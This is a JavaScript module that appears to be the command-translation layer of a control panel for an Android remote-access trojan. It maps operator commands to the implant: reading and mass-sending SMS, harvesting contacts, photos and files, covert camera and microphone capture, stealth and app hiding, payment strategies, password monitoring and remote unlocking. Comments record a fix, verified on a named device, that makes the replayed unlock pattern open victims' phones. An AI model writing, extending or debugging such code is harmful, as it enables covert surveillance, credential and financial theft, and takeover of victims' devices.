'use strict';

// Observed from the current Free APK runtime via frida_dump_free_dispatcher.js.
const FREE_COMMANDS = new Set([
  'START_GLOBAL_PERMISSION_AUTO_CLICK', 'STOP_GLOBAL_PERMISSION_AUTO_CLICK',
  'DISABLE_BLACK_SCREEN', 'ENABLE_BLACK_SCREEN',
  'CLICK', 'INPUT_TEXT', 'KEY_EVENT', 'LONG_PRESS', 'LONG_PRESS_DRAG',
  'OPEN_NOTIFICATIONS', 'OPEN_QUICK_SETTINGS', 'SWIPE', 'SWIPE_PATH',
  'back', 'click', 'home', 'input_text', 'long_press', 'long_press_drag',
  'recents', 'swipe', 'swipe_path',
  'GET_UI_HIERARCHY', 'SCREEN_CAPTURE_DISABLE', 'SCREEN_CAPTURE_PAUSE',
  'SCREEN_CAPTURE_RESUME', 'SCREEN_CAPTURE_SET_TECH', 'SCREEN_CAPTURE_SET_TECH_ADB',
  'SCREEN_CAPTURE_STOP', 'SCREEN_QUALITY', 'catAllViewSwitch', 'screen_mode', 'screen_quality',
  'ALBUM_GET_ORIGINAL', 'ALBUM_READ_THUMBNAILS', 'ALBUM_STOP', 'CAMERA_START',
  'CAMERA_STOP', 'CAMERA_SWITCH', 'MICROPHONE_SET_CONFIG',
  'MICROPHONE_START_RECORDING', 'MICROPHONE_STOP_RECORDING',
  'BLACKLIST_DEVICE', 'BLOCK_APP', 'CHANGE_SERVER_URL', 'DEVICE_ALLOW_INPUT',
  'DEVICE_BLOCK_INPUT', 'DISABLE_LOGGING', 'ENABLE_LOGGING', 'GET_APP_LIST',
  'GET_INJECTION_STATUS', 'GET_PERMISSIONS', 'HIDE_APP', 'LAUNCH_APP',
  'LOG_DISABLE', 'LOG_ENABLE', 'MUTE', 'REQUEST_PERMISSION', 'SEND_NOTIFICATION',
  'SET_BRIGHTNESS', 'SHOW_APP', 'SHOW_INJECTION', 'STOP_INJECTION', 'UNBLOCK_APP',
  'UNINSTALL_APP', 'VOLUME_DOWN', 'VOLUME_UP', 'mute', 'set_brightness',
  'FILE_COPY', 'FILE_CREATE_FOLDER', 'FILE_DELETE', 'FILE_DOWNLOAD',
  'FILE_DOWNLOAD_FROM_SERVER', 'FILE_DOWNLOAD_HTTP', 'FILE_LIST', 'FILE_MOVE',
  'FILE_RENAME', 'FILE_SEARCH', 'FILE_STORAGE_INFO', 'FILE_UPLOAD',
  'CONTACTS_READ', 'CONTACTS_SEARCH', 'CONTACTS_STATS', 'GET_CONTACTS',
  'SMS_GET_DUAL_SIM_STATUS', 'SMS_READ', 'SMS_SEND', 'SMS_SEND_ALL_CONTACTS',
  'ADD_VIEW_CACHE_RULE', 'CLEAR_VIEW_CACHE_RULES', 'DXS_PROXY',
  'GET_VIEW_CACHE_STATUS', 'REMOVE_VIEW_CACHE_RULE', 'SET_BLACK_APPS',
  'SET_PAYMENT_STRATEGIES', 'SET_SENSITIVE_APPS', 'SET_VIEW_CACHE_RULES', 'STEALTH_MODE',
  'CLEAR_ALL_LOGS', 'CLEAR_LOGS', 'DELETE_LOG', 'GET_ALL_LOG_LISTS', 'GET_LOG_LIST',
  'GET_LOG_OPTIONS', 'READ_LOG', 'SET_LOG_OPTIONS',
  'ACTIVATE_ADMIN', 'CHECK_ACCESSIBILITY', 'CHECK_ADMIN', 'DEACTIVATE_ADMIN',
  'DISABLE_ACCESSIBILITY', 'DISABLE_DND', 'ENABLE_ACCESSIBILITY', 'ENABLE_DND',
  'INSTALL_APP', 'REINSTALL_APP', 'REINSTALL_SCREEN', 'SYNC_DEVICE_ID',
  'WA_BULK_GET_CONTACTS', 'WA_BULK_PAUSE', 'WA_BULK_RESUME', 'WA_BULK_START',
  'WA_BULK_STATUS', 'WA_BULK_STOP',
  'APPLY_SECURE_SETTINGS', 'AUTO_WIRELESS_PAIRING', 'CHECK_LOCAL_STATUS',
  'DEPLOY_DXS', 'DIRECT_PAIR', 'FULL_DEPLOY', 'OPEN_ABOUT_PHONE',
  'OPEN_WIFI_DEBUG_SETTINGS', 'RESTART_LOCAL_BRIDGE', 'RESTART_LOCAL_HTTP',
  'RESTART_LOCAL_TPX', 'START_PAIRING', 'SYNC_LOCAL_CONFIG',
  'REPLAY_TOUCH_CIPHER',
  'CLEAR_PASSWORD', 'DEVICE_PING', 'GET_CURRENT_WINDOW', 'GET_DEVICE_STATE',
  'GET_PASSWORD_STATUS', 'REPLAY_PAY_COORDS',
  'ENABLE_PASSWORD_MONITORING', 'POWER_SLEEP', 'POWER_WAKE', 'SMART_MIXED_UNLOCK',
  'SMART_NUMERIC_UNLOCK', 'SMART_UNLOCK_SWIPE', 'UNLOCK_DEVICE',
  'FB_BULK_PAUSE', 'FB_BULK_RESUME', 'FB_BULK_START', 'FB_BULK_STATUS', 'FB_BULK_STOP',
  'DISABLE_BIOMETRIC', 'DISABLE_UNINSTALL_PROTECTION', 'ENABLE_UNINSTALL_PROTECTION',
  'UNINSTALL_SELF',
]);

const FRONTEND_ALIASES = Object.freeze({
  SET_SERVER: 'CHANGE_SERVER_URL',
  PING: 'DEVICE_PING',
  DEPLOY_LOCAL_SERVICE: 'DEPLOY_DXS',
  REINSTALL_SCREENCAST: 'REINSTALL_SCREEN',
  SMART_SWIPE_UNLOCK: 'SMART_UNLOCK_SWIPE',
  enableAccessibility: 'ENABLE_ACCESSIBILITY',
  disableAccessibility: 'DISABLE_ACCESSIBILITY',
  STOP_CAPTURE: 'SCREEN_CAPTURE_STOP',
  CAPTURE_SCREEN: 'SCREEN_CAPTURE_RESUME',
  STOP_SCREENCAST: 'SCREEN_CAPTURE_STOP',
  SCREENCAST: 'SCREEN_CAPTURE_RESUME',
  SYSTEM_SCREENCAST: 'SCREEN_CAPTURE_RESUME',
  SCREENSHOT: 'SCREEN_CAPTURE_RESUME',
  screenshot: 'SCREEN_CAPTURE_RESUME',
  TAP: 'CLICK',
  tap: 'click',
  CLICK: 'CLICK',
  click: 'click',
  SWIPE: 'SWIPE',
  swipe: 'swipe',
  SWIPE_PATH: 'SWIPE_PATH',
  swipe_path: 'swipe_path',
  HOME: 'home',
  BACK: 'back',
  RECENTS: 'recents',
  SET_BRIGHTNESS: 'SET_BRIGHTNESS',
  REPLAY_GESTURE: 'REPLAY_TOUCH_CIPHER',
});

const UNSUPPORTED_FRONTEND_COMMANDS = Object.freeze({
  FACTORY_RESET: 'Free runtime has no FACTORY_RESET handler',
  FORCE_STOP_APP: 'Free runtime has no FORCE_STOP_APP handler; use local-service/ADB fallback',
  INJECT_APP: 'Free runtime has no INJECT_APP handler; use SHOW_INJECTION with template payload',
  ANTI_TOUCH_SWIPE: 'Frontend expands this action into SWIPE/SWIPE_PATH gestures',
});

function objectOrEmpty(value) {
  return value && typeof value === 'object' && !Array.isArray(value) ? { ...value } : {};
}

function withAliases(source, aliases) {
  const result = { ...source };
  let value;
  for (const key of aliases) {
    if (source[key] !== undefined && source[key] !== null) {
      value = source[key];
      break;
    }
  }
  if (value !== undefined) {
    for (const key of aliases) result[key] = value;
  }
  return result;
}

function transformPayload(frontendCommand, params) {
  const source = objectOrEmpty(params);
  if (frontendCommand === 'SET_SERVER') {
    const nested = objectOrEmpty(source.data);
    const serverUrl = source.newServerUrl || source.serverUrl || nested.newServerUrl || nested.serverUrl;
    return { ...source, ...(serverUrl ? { newServerUrl: serverUrl, serverUrl } : {}), data: nested };
  }
  if (frontendCommand === 'FORCE_STOP_APP') {
    const packageName = source.packageName || source.package || source.pkg;
    return { ...source, packageName, package: packageName };
  }
  if (frontendCommand === 'REPLAY_GESTURE') {
    const points = source.points || source.path || source.data;
    return { ...source, ...(points !== undefined ? { points, path: points } : {}) };
  }
  if (frontendCommand === 'FILE_MOVE' || frontendCommand === 'FILE_COPY') {
    return {
      ...source,
      source: source.source || source.from,
      destination: source.destination || source.target,
    };
  }
  if (frontendCommand === 'FILE_RENAME') {
    const path = source.path || source.source || source.from;
    const newName = source.newName || source.name || source.targetName;
    return { ...source, ...(path ? { path } : {}), ...(newName ? { newName } : {}) };
  }
  if (frontendCommand === 'FILE_UPLOAD') {
    const path = source.path || source.destination || source.target;
    const data = source.data ?? source.content ?? source.base64;
    return { ...source, ...(path ? { path } : {}), ...(data !== undefined ? { data } : {}) };
  }
  if (frontendCommand === 'FILE_DOWNLOAD_HTTP' || frontendCommand === 'FILE_DOWNLOAD') {
    const path = source.path || source.url || source.source;
    return { ...source, ...(path ? { path } : {}) };
  }
  if (frontendCommand === 'SMS_SEND') {
    const phoneNumber = source.phoneNumber ?? source.to ?? source.address ?? source.number;
    const message = source.message ?? source.body ?? source.content;
    return {
      ...source,
      ...(phoneNumber !== undefined ? { phoneNumber, to: phoneNumber } : {}),
      ...(message !== undefined ? { message, body: message } : {}),
    };
  }
  if (frontendCommand === 'REQUEST_PERMISSION') {
    return withAliases(source, ['permission', 'permissionType']);
  }
  if (frontendCommand === 'SET_BRIGHTNESS' || frontendCommand === 'set_brightness') {
    return withAliases(source, ['brightness', 'value', 'level']);
  }
  if (frontendCommand === 'ALBUM_READ_THUMBNAILS') {
    const offset = source.offset ?? source.start ?? 0;
    const limit = source.limit ?? source.count;
    return {
      ...source,
      offset,
      ...(limit !== undefined ? { limit, count: limit } : {}),
    };
  }
  if (frontendCommand === 'ALBUM_GET_ORIGINAL') {
    return withAliases(source, ['imageId', 'path']);
  }
  if (frontendCommand === 'CAMERA_SWITCH') {
    const cameraType = source.cameraType || source.facing || source.cameraId || 'back';
    const cameraId = source.cameraId ?? (cameraType === 'front' ? 1 : cameraType === 'back' ? 0 : cameraType);
    return { ...source, cameraType, facing: cameraType, cameraId };
  }
  if (frontendCommand === 'CAMERA_START') {
    const cameraType = source.cameraType || source.facing;
    const cameraId = source.cameraId ?? (cameraType === 'front' ? 1 : cameraType === 'back' ? 0 : undefined);
    return { ...source, ...(cameraType ? { cameraType, facing: cameraType } : {}), ...(cameraId !== undefined ? { cameraId } : {}) };
  }
  if (frontendCommand === 'MICROPHONE_SET_CONFIG') {
    const quality = String(source.qualityMode || source.quality || '').toUpperCase();
    const sampleRate = source.sampleRate ?? (quality === 'HIGH' ? 44100 : quality === 'LOW' ? 8000 : 16000);
    const channels = source.channels ?? source.channelCount ?? 1;
    return { ...source, sampleRate, channels, channelCount: channels };
  }
  if (frontendCommand === 'CONTACTS_READ' || frontendCommand === 'SMS_READ' || frontendCommand === 'GET_CONTACTS') {
    const offset = source.offset ?? source.start ?? 0;
    const limit = source.limit ?? source.count;
    return { ...source, offset, ...(limit !== undefined ? { limit, count: limit } : {}) };
  }
  if (frontendCommand === 'SMART_NUMERIC_UNLOCK') {
    // The existing frontend calls this value `password`; Free's unlock
    // handler documents the same value as `pin`. Keep both fields so the
    // original APK path and the Free path can consume one request.
    const pin = source.pin ?? source.password ?? source.code;
    return {
      ...source,
      ...(pin !== undefined ? { pin, password: source.password ?? pin } : {}),
    };
  }
  if (frontendCommand === 'UNLOCK_DEVICE') {
    // ★ FIX 2026-09-12: the React frontend normalizes the pattern into a
    // NUMBER ARRAY before sending it:
    //   ControlPage.jsx: String(p.pattern).split(',').map(Number) -> [1,2,3,5,7]
    //   params: { pattern: [1,2,3,5,7], screenWidth, screenHeight }
    // The on-device trojan (liblocal-service.so -> main.handleEnterCipher /
    // main.unLockByEvents) expects a COMMA-SEPARATED STRING and splits it
    // itself. Feeding it an array makes the parse fail, so it silently falls
    // back to a default/blank gesture -> "swipe happens but the route is
    // wrong". Normalize array|string|number back to the string form here,
    // server-side, so the minified frontend bundle stays byte-identical.
    let pattern = source.pattern;
    if (pattern !== undefined && pattern !== null) {
      if (Array.isArray(pattern)) {
        pattern = pattern
          .map(v => String(v).trim())
          .filter(v => v.length > 0 && /^\d+$/.test(v))
          .join(',');
      } else if (typeof pattern === 'number') {
        // A bare number cannot be a pattern; keep it as a single point string.
        pattern = String(pattern);
      } else {
        // Already a string: strip whitespace and any non-digit separators so
        // "1 2 3 5 7" / "1-2-3-5-7" / " 1, 2 , 3 " all normalize to "1,2,3,5,7".
        const raw = String(pattern).trim();
        if (raw) {
          const digits = raw.replace(/[^\d]/g, '');
          const looksSeparated = /[,，\s\-|]/.test(raw);
          pattern = looksSeparated
            ? raw.split(/[,，\s\-|]+/).map(s => s.trim()).filter(s => s.length > 0).join(',')
            : (digits.length > 1 ? digits.split('').join(',') : raw);
        }
      }
    }
    // ★ FIX 2 2026-09-12: 1-based -> 0-based index shift.
    // VERIFIED ON DEVICE (SM-G981V 84012b2ae791b123, pattern 1-2-3-5-7):
    //   sending "1,2,3,5,7"  -> device draws 2-3-4-5-6-8  (WRONG)
    //   sending "0,1,2,4,6"  -> device draws 1-2-3-5-7     (CORRECT, unlocks)
    // The trojan treats each value as a 0-based index into the 3x3 grid
    // (grid[0][0] is the top-left dot), while the panel prompts and expects
    // the human 1-based dot numbering. Shift down by 1 so operators can keep
    // typing 1..9 naturally.
    // Guard: only shift when every value is >= 1. An input that already
    // contains a 0 is treated as 0-based and passed through untouched, which
    // keeps the previously-working "0,1,2,4,6" spelling functional.
    if (pattern !== undefined && pattern !== null && pattern !== '') {
      const pts = String(pattern).split(',').map(s => Number(String(s).trim())).filter(n => Number.isFinite(n));
      if (pts.length > 0 && pts.every(n => n >= 1 && n <= 9)) {
        pattern = pts.map(n => n - 1).join(',');
      }
    }
    return {
      ...source,
      ...(pattern !== undefined ? { pattern } : {}),
    };
  }
  if (frontendCommand === 'SMART_MIXED_UNLOCK') {
    const password = source.password ?? source.code;
    return {
      ...source,
      ...(password !== undefined ? { password } : {}),
    };
  }
  if (frontendCommand === 'SCREENSHOT' || frontendCommand === 'screenshot') {
    return { ...source, oneShot: true };
  }
  return source;
}

function mapFreeCommand(command, params = {}) {
  const frontendCommand = String(command || '');
  const freeCommand = FRONTEND_ALIASES[frontendCommand] || frontendCommand;
  const payload = transformPayload(frontendCommand, params);
  const unsupportedReason = UNSUPPORTED_FRONTEND_COMMANDS[frontendCommand];
  const invalidUnlockPassword = freeCommand === 'UNLOCK_DEVICE'
    && payload.pattern === undefined
    && (payload.password !== undefined || payload.pin !== undefined);
  const reason = unsupportedReason
    || (invalidUnlockPassword ? 'Free UNLOCK_DEVICE only accepts a pattern; use SMART_NUMERIC_UNLOCK or SMART_MIXED_UNLOCK for passwords' : '')
    || (FREE_COMMANDS.has(freeCommand) ? '' : `Free runtime command not observed: ${freeCommand}`);
  const supported = !reason;
  return {
    frontendCommand,
    command: freeCommand,
    payload,
    supported,
    reason,
  };
}

function normalizeFreeResult(value) {
  if (!value || typeof value !== 'object' || Array.isArray(value)) return value;
  const result = { ...value };
  const data = result.data && typeof result.data === 'object' && !Array.isArray(result.data)
    ? { ...result.data }
    : result.payload && typeof result.payload === 'object' && !Array.isArray(result.payload)
      ? { ...result.payload }
      : {};
  const commandId = data.cmd_id ?? data.cmdId ?? result.cmd_id ?? result.cmdId;
  if (result.type === 'cmd_ack') {
    result.freeType = result.type;
    result.type = 'command_result';
    result.data = {
      ...data,
      commandId,
      cmdId: commandId,
      acknowledged: String(data.status || result.status || '').toLowerCase() === 'ok',
      completed: false,
    };
  } else if (result.type === 'app_list_response') {
    result.freeType = result.type;
    result.type = 'app_list';
    result.data = { ...data, apps: Array.isArray(data.apps) ? data.apps : [] };
  } else if (result.type === 'file_response' && Array.isArray(data.files)) {
    result.freeType = result.type;
    result.type = 'file_list';
    result.data = {
      ...data,
      files: data.files.map((file) => {
        const item = objectOrEmpty(file);
        const isDirectory = item.isDirectory === true || item.isDir === true || item.type === 'directory';
        return {
          ...item,
          isDirectory,
          isDir: isDirectory,
          type: isDirectory ? 'directory' : 'file',
          fullPath: item.fullPath || item.path || '',
        };
      }),
    };
  } else if (result.type === 'file_response' && data.total !== undefined && data.free !== undefined) {
    result.freeType = result.type;
    result.type = 'file_storage_info';
    result.data = { ...data };
  } else if (result.type === 'contacts_response' || result.type === 'contacts_data') {
    const contacts = Array.isArray(data.contacts) ? data.contacts
      : Array.isArray(data.items) ? data.items
        : Array.isArray(data.data) ? data.data
          : [];
    result.freeType = result.type;
    result.type = 'contacts';
    result.data = { ...data, contacts };
  } else if (result.type === 'sms_response' || result.type === 'sms_list') {
    const messages = Array.isArray(data.messages) ? data.messages
      : Array.isArray(data.smsList) ? data.smsList
        : Array.isArray(data.sms) ? data.sms
          : Array.isArray(data.data) ? data.data
            : [];
    result.freeType = result.type;
    result.type = 'sms_data';
    result.data = { ...data, messages, smsList: messages, count: data.count ?? messages.length };
  } else if (result.type === 'sms_send_response') {
    const phoneNumber = data.phoneNumber ?? data.to ?? data.address ?? '';
    result.freeType = result.type;
    result.type = 'sms_send_result';
    result.data = { ...data, phoneNumber, simSlot: data.simSlot ?? data.slot ?? 0 };
  } else if (result.type === 'album_response' || result.type === 'album_thumbnails_response') {
    const images = Array.isArray(data.images) ? data.images
      : Array.isArray(data.photos) ? data.photos
        : Array.isArray(data.thumbnails) ? data.thumbnails
          : Array.isArray(data.data) ? data.data
            : [];
    result.freeType = result.type;
    result.type = 'album_data';
    result.data = { ...data, images };
  } else if (result.type === 'camera_frame_response') {
    result.freeType = result.type;
    result.type = 'camera_frame';
    result.data = { ...data };
  } else if (result.type === 'microphone_response' || result.type === 'audio_response') {
    result.freeType = result.type;
    result.type = 'microphone_data';
    result.data = { ...data };
  } else if (String(result.type || '').toLowerCase() === 'smart_unlock_result') {
    result.data = {
      ...data,
      ...(data.success === undefined && result.success !== undefined ? { success: result.success } : {}),
      ...(data.message === undefined && result.message !== undefined ? { message: result.message } : {}),
      ...(data.error === undefined && result.error !== undefined ? { error: result.error } : {}),
    };
  } else if (result.type === 'error' || result.type === 'cmd_error' || result.type === 'command_error') {
    result.freeType = result.type;
    result.type = 'command_result';
    result.data = {
      ...data,
      commandId,
      cmdId: commandId,
      success: false,
      error: data.error || result.error || result.message || 'Free command failed',
    };
  }
  return result;
}

function isKnownFreeCommand(command) {
  const value = String(command || '');
  return FREE_COMMANDS.has(value)
    || Object.prototype.hasOwnProperty.call(FRONTEND_ALIASES, value)
    || Object.prototype.hasOwnProperty.call(UNSUPPORTED_FRONTEND_COMMANDS, value);
}

module.exports = {
  FREE_COMMANDS,
  FRONTEND_ALIASES,
  UNSUPPORTED_FRONTEND_COMMANDS,
  isKnownFreeCommand,
  mapFreeCommand,
  normalizeFreeResult,
};
